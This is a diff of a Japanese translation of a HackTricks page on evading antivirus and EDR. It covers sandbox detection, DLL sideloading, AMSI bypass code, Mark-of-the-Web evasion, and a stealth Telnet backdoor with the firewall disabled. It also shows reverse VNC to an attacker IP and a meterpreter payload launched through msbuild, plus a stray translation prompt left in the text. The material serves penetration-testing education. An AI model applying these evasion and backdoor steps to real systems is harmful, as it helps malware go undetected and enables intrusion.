@@ -4,11 +4,11 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新のPEASSバージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
 * [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
-* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォロー**してください。**
-* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)や[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、ハッキングのコツを共有してください。**
+* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
+* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)にPRを提出して、ハッキングのコツを共有してください。**そして** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)も。
 
 </details>
 
@@ -16,23 +16,23 @@
 
 ## **AV回避方法論**
 
-現在、AVはファイルが悪意のあるものかどうかをチェックするために、静的検出、動的分析、そしてより高度なEDRの場合は行動分析など、さまざまな方法を使用しています。
+現在、AVはファイルが悪意のあるものかどうかをチェックするために、静的検出、動的分析、そしてより進んだEDRの場合は行動分析など、異なる方法を使用しています。
 
 ### **静的検出**
 
-静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイト配列をフラグ付けすること、およびファイル自体から情報を抽出すること（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）によって達成されます。これは、公開されている既知のツールを使用すると、それらが悪意のあるものとして分析されてフラグ付けされている可能性が高いため、より簡単に捕まる可能性があることを意味します。この種の検出を回避する方法はいくつかあります：
+静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイト配列をフラグ付けすること、およびファイル自体から情報を抽出すること（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）によって達成されます。これは、公開されている既知のツールを使用すると、それらがおそらく分析されて悪意のあるものとしてフラグ付けされているため、より簡単に捕まる可能性があることを意味します。この種の検出を回避する方法はいくつかあります：
 
 * **暗号化**
 
-バイナリを暗号化すると、AVがプログラムを検出する方法はありませんが、メモリ内でプログラムを復号化して実行するための何らかのローダーが必要になります。
+バイナリを暗号化すると、AVはプログラムを検出する方法がなくなりますが、メモリ内でプログラムを復号化して実行するための何らかのローダーが必要になります。
 
 * **難読化**
 
-AVを回避するためには、バイナリやスクリプトの一部の文字列を変更するだけで十分な場合もありますが、何を難読化しようとしているかによっては、これは時間がかかる作業になることがあります。
+AVを回避するためには、バイナリやスクリプトの一部の文字列を変更するだけで済むことがありますが、何を難読化しようとしているかによっては、時間がかかる作業になることがあります。
 
 * **カスタムツール**
 
-独自のツールを開発すると、既知の悪い署名はありませんが、これには多くの時間と労力がかかります。
+独自のツールを開発すれば、既知の悪い署名は存在しないのですが、これには多くの時間と労力がかかります。
 
 {% hint style="info" %}
 Windows Defenderの静的検出に対してチェックする良い方法は[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)です。基本的にはファイルを複数のセグメントに分割し、それぞれをDefenderにスキャンさせることで、バイナリ内のどの文字列やバイトがフラグ付けされているかを正確に教えてくれます。
@@ -42,10 +42,10 @@ Windows Defenderの静的検出に対してチェックする良い方法は[Thr
 
 ### **動的分析**
 
-動的分析は、AVがバイナリをサンドボックスで実行し、悪意のある活動を監視するときに行われます（例：ブラウザのパスワードを復号化して読み取ろうとする、LSASSにミニダンプを実行するなど）。この部分は少し扱いにくいかもしれませんが、サンドボックスを回避するためにできることがいくつかあります。
+動的分析は、AVがバイナリをサンドボックスで実行し、悪意のある活動を監視するときに行われます（例：ブラウザのパスワードを復号化して読み取ろうとする、LSASSに対してミニダンプを実行するなど）。この部分は少し扱いにくいかもしれませんが、サンドボックスを回避するためにできることがいくつかあります。
 
-* **実行前のスリープ** どのように実装されているかによって、AVの動的分析を回避する素晴らしい方法になる可能性があります。AVはユーザーのワークフローを中断しないようにファイルをスキャンする時間が非常に短いため、長いスリープを使用するとバイナリの分析を妨げることができます。問題は、多くのAVのサンドボックスが、実装方法によってはスリープをスキップすることができるということです。
-* **マシンのリソースのチェック** 通常、サンドボックスは非常に少ないリソース（例：< 2GB RAM）を使用しています。そうでなければ、ユーザーのマシンを遅くする可能性があります。ここで非常に創造的になることもできます。たとえば、CPUの温度やファンの速度をチェックするなど、サンドボックスにはすべてが実装されているわけではありません。
+* **実行前のスリープ** どのように実装されているかによって、AVの動的分析を回避する素晴らしい方法になることがあります。AVはユーザーのワークフローを中断しないようにファイルをスキャンする時間が非常に短いため、長いスリープを使用するとバイナリの分析が乱れる可能性があります。問題は、多くのAVのサンドボックスが、実装方法によってはスリープをスキップできることです。
+* **マシンのリソースのチェック** 通常、サンドボックスは非常に少ないリソース（例：< 2GB RAM）で動作します。そうでなければ、ユーザーのマシンを遅くする可能性があります。ここで非常に創造的になることもできます。たとえば、CPUの温度やファンの速度をチェックするなど、サンドボックスにはすべてが実装されているわけではありません。
 * **マシン固有のチェック** "contoso.local"ドメインに参加しているユーザーをターゲットにしたい場合は、コンピューターのドメインをチェックして、指定したものと一致するかどうかを確認できます。一致しない場合は、プログラムを終了させることができます。
 
 Microsoft Defenderのサンドボックスコンピューター名はHAL9THであることがわかったので、マルウェア内でコンピューター名をチェックすることができます。名前がHAL9THと一致する場合は、Defenderのサンドボックス内にいることを意味するので、プログラムを終了させることができます。
@@ -60,7 +60,7 @@ Microsoft Defenderのサンドボックスコンピューター名はHAL9THで�
 
 たとえば、LSASSをダンプしたい場合、本当に**mimikatzを使用する必要がありますか**？それとも、LSASSをダンプする別の、あまり知られていないプロジェクトを使用できますか。
 
-正しい答えはおそらく後者です。例としてmimikatzを取り上げると、それはおそらくAVやEDRによって最もフラグ付けされているマルウェアの1つ、もしくは最もフラグ付けされているものであり、プロジェクト自体は非常にクールですが、AVを回避するためにそれを使用することは悪夢です。ですので、達成しようとしていることの代替案を探してください。
+正しい答えはおそらく後者です。例としてmimikatzを取り上げると、それはおそらくAVとEDRによって最もフラグ付けされているマルウェアの1つ、もしくは最もフラグ付けされているものですが、プロジェクト自体は非常にクールですが、AVを回避するためにそれを使用するのは悪夢です。ですので、達成しようとしていることの代替案を探してください。
 
 {% hint style="info" %}
 回避のためにペイロードを変更するときは、Defenderで**自動サンプル提出をオフにする**ことを確認し、そしてお願いですが、本気で長期的な回避を目指している場合は、**VIRUSTOTALにアップロードしないでください**。特定のAVでペイロードが検出されるかどうかを確認したい場合は、VMにインストールし、自動サンプル提出をオフにし、結果に満足するまでテストしてください。
@@ -68,19 +68,19 @@ Microsoft Defenderのサンドボックスコンピューター名はHAL9THで�
 
 ## EXEとDLL
 
-可能な限り、常に**回避のためにDLLの使用を優先**してください。私の経験では、DLLファイルは通常、**はるかに検出されにくく**分析されることも少ないので、いくつかのケースで検出を避けるために使用できる非常にシンプルなトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。
+可能な限り、常に**回避のためにDLLの使用を優先**してください。私の経験では、DLLファイルは通常、**はるかに検出されにくい**し、分析されることも少ないので、いくつかのケースで検出を避けるための非常にシンプルなトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。
 
 この画像でわかるように、HavocのDLLペイロードはantiscan.meで4/26の検出率を持っていますが、EXEペイロードは7/26の検出率を持っています。
 
 <figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.meでの通常のHavoc EXEペイロードと通常のHavoc DLLの比較</p></figcaption></figure>
 
-これから、DLLファイルを使用してさらに隠密に行動するためのいくつかのコツを紹介します。
+これから、DLLファイルを使用してもっと隠密に行動するためのいくつかのコツを紹介します。
 
 ## DLLサイドローディング & プロキシング
 
-**DLLサイドローディング**は、ローダーが使用するDLL検索順序を利用し、被害者アプリケーションと悪意のあるペイロードを隣り合わせに配置することで利用します。
+**DLLサイドローディング**は、ローダーが使用するDLL検索順序を利用して、被害者アプリケーションと悪意のあるペイロードを隣り合わせに配置することで利用します。
 
-DLLサイドローディングに対応しているプログラムを[Siofra](https://github.com/Cybereason/siofra)と次のpowershellスクリプトを使用してチェックできます：
+[Siofra](https://github.com/Cybereason/siofra)と次のpowershellスクリプトを使用して、DLLサイドローディングに対応しているプログラムをチェックできます：
 
 {% code overflow="wrap" %}
 ```powershell
@@ -93,11 +93,11 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 このコマンドは、"C:\Program Files\\" 内のDLLハイジャックの可能性があるプログラムのリストと、それらが試みるDLLファイルをロードするリストを出力します。
 
-私はあなたに**自分自身でDLLハイジャック可能/サイドロード可能なプログラムを探索すること**を強くお勧めします。この技術は適切に行われるとかなり隠密ですが、公に知られているDLLサイドロード可能なプログラムを使用すると、簡単に捕まる可能性があります。
+私はあなたに**自分自身でDLLハイジャック可能/サイドロード可能なプログラムを探索すること**を強くお勧めします。この技術は適切に行われればかなり隠密ですが、公に知られているDLLサイドロード可能なプログラムを使用すると、簡単に捕まる可能性があります。
 
 プログラムがロードしようとする名前の悪意のあるDLLを配置するだけでは、ペイロードはロードされません。プログラムはそのDLL内に特定の関数を期待しているためです。この問題を解決するために、**DLLプロキシング/フォワーディング**と呼ばれる別の技術を使用します。
 
-**DLLプロキシング**は、プロキシ（および悪意のある）DLLからオリジナルのDLLへのプログラムの呼び出しを転送し、プログラムの機能を維持しつつ、ペイロードの実行を処理することができます。
+**DLLプロキシング**は、プロキシ（および悪意のある）DLLからのプログラムの呼び出しを元のDLLに転送し、プログラムの機能を維持しつつ、ペイロードの実行を処理することができます。
 
 私は[@flangvik](https://twitter.com/Flangvik/)の[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)プロジェクトを使用します。
 
@@ -138,7 +138,7 @@ DLLサイドローディングについての[S3cur3Th1sSh1tのTwitch VOD](https
 
 `Freezeは、中断されたプロセス、直接システムコール、および代替実行方法を使用してEDRをバイパスするためのペイロードツールキットです`
 
-Freezeを使用して、シェルコードを隠密にロードして実行できます。
+Freezeを使用して、シェルコードを目立たない方法でロードして実行できます。
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -148,12 +148,12 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-回避は猫とネズミのゲームです。今日効果があるものが明日検出される可能性がありますので、一つのツールにのみ依存しないでください。可能であれば、複数の回避技術を連鎖させて試してみてください。
+回避は猫とネズミのゲームです。今日効果があるものが明日検出される可能性がありますので、一つのツールにのみ依存しないでください。可能であれば、複数の回避技術を連鎖させて試みてください。
 {% endhint %}
 
 ## AMSI (アンチマルウェア スキャン インターフェース)
 
-AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless\_malware)」を防ぐために作られました。初期のAVは**ディスク上のファイル**のスキャンのみが可能でしたので、何とかしてペイロードを**直接メモリ内で実行**できれば、AVは何も防げませんでした。なぜなら、十分な可視性がなかったからです。
+AMSIは「[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless\_malware)」を防ぐために作られました。初期のAVは**ディスク上のファイル**のスキャンのみが可能でしたので、ペイロードを**直接メモリ内で実行**できれば、AVは何も防げませんでした。なぜなら、十分な可視性がなかったからです。
 
 AMSI機能はWindowsのこれらのコンポーネントに統合されています。
 
@@ -177,13 +177,13 @@ AMSIを回避する方法はいくつかあります：
 
 * **難読化**
 
-AMSIは主に静的検出を行うため、ロードしようとするスクリプトを変更することは検出を回避する良い方法になり得ます。
+AMSIは主に静的検出を行うため、ロードしようとするスクリプトを変更することは、検出を回避するための良い方法です。
 
-しかし、AMSIは複数のレイヤーがあってもスクリプトの難読化を解除する能力があるため、難読化はどのように行われるかによっては悪い選択肢になる可能性があります。これにより、回避はそれほど簡単ではありません。ただし、時には変数名を数個変更するだけで十分な場合もあるので、何がどれだけフラグが立てられているかによります。
+しかし、AMSIは複数のレイヤーがあってもスクリプトの難読化を解除する能力があるため、難読化はどのように行われるかによっては悪い選択肢になる可能性があります。そのため、回避はそれほど簡単ではありません。ただし、時には変数名をいくつか変更するだけで十分な場合もあるので、どれだけ何かがフラグされているかによります。
 
 * **AMSIバイパス**
 
-AMSIはpowershell（またはcscript.exe、wscript.exeなど）プロセスにDLLをロードすることによって実装されているため、特権のないユーザーとして実行していても簡単に改ざんすることができます。AMSIの実装にこの欠陥があるため、研究者たちはAMSIスキャンを回避する複数の方法を見つけました。
+AMSIはpowershell（またはcscript.exe、wscript.exeなど）プロセスにDLLをロードすることによって実装されているため、特権のないユーザーとして実行していても簡単に改ざんすることができます。このAMSIの実装の欠陥により、研究者たちはAMSIスキャンを回避する複数の方法を見つけました。
 
 **エラーを強制する**
 
@@ -213,23 +213,23 @@ $Spotfix.SetValue($null,$true)
 ```
 以下は、ハッキング技術に関するハッキングの本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。
 
-**Memory Patching**
+**メモリパッチング**
 
-この技術は最初に[@RastaMouse](https://twitter.com/\_RastaMouse/)によって発見され、amsi.dll（ユーザー提供の入力をスキャンする責任がある）の"AmsiScanBuffer"関数のアドレスを見つけ、E_INVALIDARGのコードを返す命令で上書きすることを含んでいます。この方法では、実際のスキャンの結果は0を返し、これはクリーンな結果と解釈されます。
+この技術は最初に[@RastaMouse](https://twitter.com/\_RastaMouse/)によって発見され、amsi.dll（ユーザー提供の入力をスキャンする責任がある）の"AmsiScanBuffer"関数のアドレスを見つけ、E_INVALIDARGのコードを返す命令で上書きすることを含んでいます。この方法では、実際のスキャンの結果は0を返し、これはクリーンな結果として解釈されます。
 
 {% hint style="info" %}
-より詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)をお読みください。
+より詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)を読んでください。
 {% endhint %}
 
 powershellを使用してAMSIをバイパスするために使用される他の多くの技術もあります。[**このページ**](basic-powershell-for-pentesters/#amsi-bypass)と[このリポジトリ](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をチェックして、それらについてもっと学んでください。
 
 または、このスクリプトはメモリパッチングを介して新しいPowershをパッチします
 
-## Obfuscation
+## 難読化
 
-以下のツールは、**C# クリアテキストコードの難読化**、バイナリのコンパイルに使用する**メタプログラミングテンプレートの生成**、または**コンパイル済みバイナリの難読化**に使用できます：
+以下のツールは、**C# クリアテキストコードを難読化する**、バイナリをコンパイルするための**メタプログラミングテンプレートを生成する**、または**コンパイルされたバイナリを難読化する**ために使用できます：
 
-* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 難読化ツール**
+* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# 難読化ツール**
 * [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) コンパイルスイートのオープンソースフォークを提供し、[コード難読化](http://en.wikipedia.org/wiki/Obfuscation\_\(software\))と改ざん防止を通じてソフトウェアのセキュリティを向上させることです。
 * [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、コンパイラを変更することなく、外部ツールを使用せずに、コンパイル時に`C++11/14`言語を使用して難読化されたコードを生成する方法を示しています。
 * [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングフレームワークによって生成された難読化された操作の層を追加し、アプリケーションをクラックしようとする人の作業を少し難しくします。
@@ -249,19 +249,19 @@ Microsoft Defender SmartScreenは、エンドユーザーが潜在的に悪意�
 
 SmartScreenは主に評判ベースのアプローチで動作し、一般的でないダウンロードアプリケーションはSmartScreenをトリガーし、エンドユーザーに警告し、ファイルの実行を防ぎます（ただし、[詳細情報 -> とにかく実行]をクリックすることでファイルは実行できます）。
 
-**MoTW**（Mark of The Web）は、インターネットからダウンロードしたファイルに自動的に作成されるZone.Identifierという名前の[NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))です。これには、ダウンロード元のURLも含まれます。
+**MoTW**（ウェブのマーク）は、インターネットからダウンロードしたファイルに自動的に作成される[NTFS代替データストリーム](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))で、Zone.Identifierという名前が付けられ、ダウンロード元のURLも一緒に作成されます。
 
 <figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認します。</p></figcaption></figure>
 
 {% hint style="info" %}
-**信頼された**署名証明書で署名された実行可能ファイルは**SmartScreenをトリガーしない**ということに注意してください。
+**信頼された**署名証明書で署名された実行可能ファイルは**SmartScreenをトリガーしない**ことに注意してください。
 {% endhint %}
 
-Webのマークをペイロードから防ぐ非常に効果的な方法は、ISOのような何らかのコンテナ内にそれらをパッケージ化することです。これは、Mark-of-the-Web（MOTW）は**非NTFS**ボリュームには**適用できない**ためです。
+ペイロードがウェブのマークを取得するのを防ぐ非常に効果的な方法は、ISOのような何らかのコンテナ内にパッケージ化することです。これは、ウェブのマーク（MOTW）が**非NTFS**ボリュームには**適用できない**ためです。
 
 <figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Webのマークを回避するためにペイロードを出力コンテナにパッケージ化するツールです。
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、ウェブのマークを回避するためにペイロードを出力コンテナにパッケージ化するツールです。
 
 使用例：
 ```powershell
@@ -291,21 +291,21 @@ Adding file: /TotallyLegitApp.exe
 
 ## C# アセンブリリフレクション
 
-メモリ内でC#バイナリをロードすることは以前から知られており、AVに捕まることなくポストエクスプロイトツールを実行するための非常に優れた方法です。
+メモリ内でC#バイナリをロードする方法は以前から知られており、AVに検出されずにポストエクスプロイトツールを実行するための非常に優れた方法です。
 
-ペイロードはディスクに触れることなく直接メモリにロードされるため、プロセス全体に対してAMSIをパッチすることだけを心配すればよいでしょう。
+ペイロードがディスクに触れることなく直接メモリにロードされるため、AMSIをパッチすることだけを心配すればよいです。
 
 ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、メモリ内で直接C#アセンブリを実行する機能を提供していますが、実行方法にはいくつかの違いがあります：
 
 * **Fork\&Run**
 
-新しい犠牲プロセスを**生成し**、その新しいプロセスにポストエクスプロイトの悪意のあるコードを注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了させることを含みます。これには利点と欠点があります。fork and runメソッドの利点は、実行がBeaconインプラントプロセスの**外部**で行われることです。これは、ポストエクスプロイトアクションで何かが間違っていたり、捕まったりした場合でも、インプラントが**生き残る可能性がはるかに高い**ことを意味します。欠点は、**行動検出**によって捕まる**可能性が高くなる**ことです。
+新しい犠牲プロセスを**生成し**、その新しいプロセスにポストエクスプロイトの悪意のあるコードを注入し、悪意のあるコードを実行し、終了したら新しいプロセスを終了させることを含みます。これには利点と欠点があります。fork and runメソッドの利点は、実行がBeaconインプラントプロセスの**外部**で行われることです。これは、ポストエクスプロイトアクションで何かが間違っていたり、検出されたりした場合、インプラントが**生き残る可能性が**はるかに高いことを意味します。欠点は、**行動検出**によって検出される可能性が**高くなる**ことです。
 
 <figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-ポストエクスプロイトの悪意のあるコードを**自身のプロセスに注入する**ことについてです。この方法では、新しいプロセスを作成し、AVにスキャンされることを避けることができますが、ペイロードの実行に何か問題が発生した場合、ビーコンを**失う可能性がはるかに高く**なります。なぜなら、それによってクラッシュする可能性があるからです。
+ポストエクスプロイトの悪意のあるコードを**自身のプロセスに注入する**ことについてです。この方法では、新しいプロセスを作成し、AVにスキャンされることを避けることができますが、ペイロードの実行に何か問題が発生した場合、**ビーコンを失う可能性が**はるかに高くなります。なぜなら、それによってクラッシュする可能性があるからです。
 
 <figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -313,7 +313,7 @@ Adding file: /TotallyLegitApp.exe
 C# アセンブリローディングについてもっと読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) とそのInlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) をチェックしてください。
 {% endhint %}
 
-また、C# アセンブリを**PowerShellからロード**することもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。
+また、PowerShellからC#アセンブリをロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk) をチェックしてください。
 
 ## 他のプログラミング言語の使用
 
@@ -321,11 +321,11 @@ C# アセンブリローディングについてもっと読みたい場合は�
 
 SMB共有上のインタープリタバイナリと環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語の任意のコードを**実行することができます**。
 
-リポジトリは次のように示しています：Defenderはスクリプトを引き続きスキャンしますが、Go、Java、PHPなどを利用することで、静的シグネチャをバイパスするための**柔軟性が増します**。これらの言語でランダムな未難読化リバースシェルスクリプトをテストした結果、成功しています。
+リポジトリは次のように示しています：Defenderはスクリプトを引き続きスキャンしますが、Go、Java、PHPなどを利用することで、静的シグネチャをバイパスする**柔軟性が増します**。これらの言語でランダムな未難読化リバースシェルスクリプトをテストした結果、成功しています。
 
 ## 高度な回避
 
-回避は非常に複雑なトピックであり、時には一つのシステム内の多くの異なるテレメトリソースを考慮に入れなければならないため、成熟した環境で完全に検出されないことはほぼ不可能です。
+回避は非常に複雑なトピックであり、時には一つのシステム内で多くの異なるテレメトリソースを考慮に入れなければならないため、成熟した環境で完全に検出されないことはほぼ不可能です。
 
 対峙するすべての環境には、それぞれの強みと弱みがあります。
 
@@ -339,17 +339,22 @@ SMB共有上のインタープリタバイナリと環境へのアクセスを�
 
 ## **古い技術**
 
-### **Telnet サーバー**
+### **Defenderが悪意あると判断する部分をチェックする**
 
-Windows10まで、すべてのWindowsには**Telnetサーバー**が付属しており、管理者として次の操作を行うことでインストールできました：
-```
+[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、バイナリの一部を**削除して**、Defenderが悪意あると判断する部分を見つけ出し、分割してくれます。\
+同じことを行う別のツールは [**avred**](https://github.com/dobin/avred) で、サービスを提供するオープンウェブが [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にあります。
+
+### **Telnetサーバー**
+
+Windows10まで、すべてのWindowsには**Telnetサーバー**があり、次のようにして管理者としてインストールすることができました：
+```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
 システムが起動したときに**開始**し、今すぐ**実行**します：
-```
+```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
-**telnet ポートの変更**（ステルス）およびファイアウォールの無効化：
+**telnet ポートの変更**（ステルス）とファイアウォールの無効化：
 ```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
@@ -368,13 +373,13 @@ netsh advfirewall set allprofiles state off
 
 #### **リバース接続**
 
-**攻撃者** は自分の **ホスト** 内で `vncviewer.exe -listen 5900` を実行し、リバース **VNC接続** をキャッチする準備をします。その後、**被害者** 内で: winvncデーモン `winvnc.exe -run` を開始し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します
+**攻撃者**は自分の **ホスト** 内でバイナリ `vncviewer.exe -listen 5900` を **実行** し、リバース **VNC接続** をキャッチする準備をします。その後、**被害者** 内で: winvncデーモンを `winvnc.exe -run` で起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します
 
 **警告:** ステルスを維持するためにはいくつかのことを行ってはいけません
 
-* `winvnc` が既に実行中の場合は起動しないでください。そうすると [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中かどうかを確認してください
-* 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。そうすると [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
-* ヘルプのために `winvnc -h` を実行しないでください。そうすると [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます
+* 既に実行中の場合は `winvnc` を開始しないでください。そうすると[ポップアップ](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc` で実行中かどうかを確認してください
+* 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を開始しないでください。そうすると[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png)が開きます
+* ヘルプのために `winvnc -h` を実行しないでください。そうすると[ポップアップ](https://i.imgur.com/oc18wcu.png)が表示されます
 
 ### GreatSCT
 
@@ -386,7 +391,8 @@ cd GreatSCT/setup/
 cd ..
 ./GreatSCT.py
 ```
-Inside GreatSCT: の中で：
+Inside GreatSCT:
+GreatSCTの内部:
 ```
 use 1
 list #Listing available payloads
@@ -396,13 +402,15 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-**リスナーを開始**するには `msfconsole -r file.rc` を使用し、**xmlペイロード**を実行します:
+```
+msfconsole -r file.rc を使用して **リスナーを起動し**、以下で **xmlペイロードを実行します**:
+```
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
 **現在のディフェンダーはプロセスを非常に迅速に終了させます。**
 
-### 独自のリバースシェルのコンパイル
+### 独自のリバースシェルをコンパイルする
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
@@ -561,10 +569,10 @@ https://github.com/praetorian-code/vulcan
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
+* **サイバーセキュリティ会社**で働いていますか？**HackTricksにあなたの会社を広告したいですか？** または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
